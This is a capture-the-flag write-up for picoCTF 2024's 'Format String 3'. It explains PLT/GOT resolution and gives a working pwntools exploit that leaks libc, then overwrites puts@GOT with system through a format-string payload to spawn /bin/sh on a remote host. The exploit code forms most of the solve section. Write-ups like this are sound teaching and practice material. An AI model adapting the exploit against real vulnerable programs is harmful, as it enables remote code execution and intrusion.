## CTF: picoCTF 2024

Challenge: Format String 3

Category: pwn

Points: 10

Difficulty: Intermediate

## Instructions

This program doesn't contain a win function. How can you win?

## Solution

This is a culmination of all the format-string challenges so far. It involves using a GOT overwrite to call /bin/sh and cat out the flag on the remote server.

### GOT and PLT

The **Procedure Linkage Table (PLT)** is like an assistant at the front of the office. A program calls `puts@PLT` which asks the assistant where puts is. The PLT then looks up the address in the **Global Offset Table (GOT)**. The GOT holds address offsets from libc's base. Because of ASLR, libc's address changes every time, so you go through PLT -> GOT. On first call, the GOT has an address that calls the top of the PLT to resolve the real address. After that, the GOT has the real address cached.

### GOT Overwrite

To perform a GOT overwrite, put the address you actually want to call into the GOT entry. When PLT looks for puts, it gets system instead.

### Solve

Baseline checks:

```bash
$ checksec format-string-3
[*] '/home/shinigami/DrBrown/format-string-3'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
```

The program leaks the address of setvbuf in libc, has a format string vulnerability, and calls `puts("/bin/sh")` at the end. Since `puts` and `system` both take a string argument, overwriting `puts@GOT` with `system` turns `puts("/bin/sh")` into `system("/bin/sh")`.

Find puts@GOT:

```
0x401080 <puts@plt>:  jmp QWORD PTR [rip+0x2f76]  # 0x404000 <puts@got.plt>
```

After fuzzing, input offset is 38. Use the leaked setvbuf address to calculate libc base and system's address.

### Exploit

```python
from pwn import *
libc = ELF('libc.so.6')
elf = context.binary = ELF("./format-string-3")
p = remote('xebec.cylabacademy.net', 33867)
p.recvuntil(":")
leaked = p.recvline().strip()
libc.address = int(leaked,16) - libc.symbols['setvbuf']
system = libc.symbols['system']

payload = fmtstr_payload(38, {elf.got.puts : system})
p.sendline(payload)
p.interactive()
```

## Flag

```
academy{G07_G07?_d4aea0bd}
```

## Mitigation

Don't have a format string vulnerability and never trust input from the user. Always check for the size, and use printf correctly.
